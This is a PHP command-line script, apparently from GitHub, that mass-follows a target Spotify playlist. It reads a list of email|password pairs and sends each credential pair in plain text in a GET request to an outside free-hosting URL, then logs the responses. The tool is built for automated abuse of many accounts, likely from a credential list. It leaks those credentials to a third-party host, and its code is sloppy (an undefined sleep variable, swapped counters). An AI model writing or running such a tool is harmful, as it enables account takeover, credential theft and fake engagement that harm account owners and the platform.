<?php
ini_set('date.timezone', 'Asia/Jakarta');
ob_implicit_flush(true);
error_reporting(0);
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
echo "============================================\n";
echo "  	Spotify Auto Follow Playlist [Target] \n"; 
echo "               Github : Zeldriss    	\n";
echo "============================================\n";
echo "[+] List : ";
$list = trim(fgets(STDIN));
$delim = "|";
echo "[+] Target Follow : ";
$target = trim(fgets(STDIN));
echo "============================================\n";
echo "[~] Starting Follow Playlist...\n";
echo "============================================\n";
$file = file_get_contents("$list");
$data = explode("\n",$file);
$jumlah= 0; $live=0; $mati=0;
for($a=0;$a<count($data);$a++){
	$date = date("h:i:sa");
        $data1 = explode($delim,$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];
	$cek = @file_get_contents("http://hadehente69.000webhostapp.com/playlist/example.php?user=$email&pass=$pass&target=$target");
	if (strpos($cek,"This request requires user authentication.")) {
 if(!in_array($cek,explode("\n",@file_get_contents("success.txt")))){
  $h=fopen("success.txt","a");
  fwrite($h,$cek."\n");
  fclose($h);
   
  }
		echo "\033[95m [" . $date . "]\033[0m"; $cek = "\033[91m [ERROR] \033[0m"; $live+=1;
  }else{
		echo "\033[95m [" . $date . "]\033[0m"; $cek = "\033[92m [OK] \033[0m"; $mati+=1;
	}
	ob_flush();
	sleep($tidur);
  print($cek.$email."|".$pass."\n");
}
	echo "============================================\n";
	print ("Success \033[1;34mFollow PLAYLIST! : " . count($data). "\033[0m\n");
	echo "FOLLOW PLAYLIST \033[91mERROR: $live \033[0mand account \033[92mOK: $mati\033[0m \n";

?>
